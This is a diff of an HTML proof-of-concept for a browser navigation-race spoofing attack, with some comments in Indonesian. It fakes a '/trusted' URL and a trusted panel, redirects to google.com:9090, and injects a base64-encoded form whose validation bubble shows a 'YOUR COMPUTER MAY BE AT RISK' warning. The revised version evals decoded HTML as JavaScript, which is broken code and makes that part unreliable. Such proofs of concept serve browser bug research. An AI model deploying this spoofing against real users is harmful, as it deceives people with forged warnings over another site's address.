@@ -1,36 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Navigation Race PoC</title>
+<style>
+  #panel {
+    display: none;
+    position: fixed;
+    top: 20%;
+    left: 30%;
+    padding: 20px;
+    background: #fff;
+    border: 2px solid #000;
+    z-index: 9999;
+  }
+</style>
+</head>
+
 <body>
-<button onclick="foo()">go</button>
-</body>
+
+<button id="trigger">GO</button>
+
+<div id="panel">
+  <p>Trusted UI Panel</p>
+</div>
 
 <script>
-var w;
-var t;
+const trigger = document.getElementById('trigger');
+const panel   = document.getElementById('panel');
 
-function foo(){
+/*
+ * Step 1:
+ * User interaction → change URL + show trusted UI
+ */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
 
-    // Redirect setelah 10 detik
-    w = setTimeout(function(){
-        document.location = "https://www.google.com";
-    }, 10000);
+  // Optional: start delayed redirect timer
+  startRace();
+};
 
-    // Cek window tiap 100ms (lebih ringan)
-    t = setInterval(bar, 100);
+let raceTimer;
+
+/*
+ * Step 2:
+ * Navigation race after permission / page show
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+
+      // ⏱️ delay diperpanjang (bisa diubah)
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 500); // sebelumnya 80ms
+
+    });
+  });
+});
+
+/*
+ * Optional helper
+ * Menunda race supaya lebih realistic
+ */
+function startRace() {
+  raceTimer = setTimeout(() => {
+    console.log('Race armed');
+    injectPayload();  // Menyuntikkan payload
+  }, 2000); // 2 detik
 }
 
-function bar(){
-    try{
-        w.location.href;
-    }
-    catch(e){
-        clearInterval(t);
+/*
+ * Menyuntikkan payload yang di-decode dari base64
+ */
+function injectPayload() {
+  const payload = atob(
+    'PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSyIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDE1MDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='
+  );
 
-        // Payload dijalankan setelah 5 detik
-        setTimeout(function(){
-            document.write(atob(
-                'PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSyIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDE1MDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='
-            ));
-            test();
-        }, 5000);
-    }
+  // Execute the payload code
+  eval(payload);
 }
 </script>
+
+</body>
+</html>
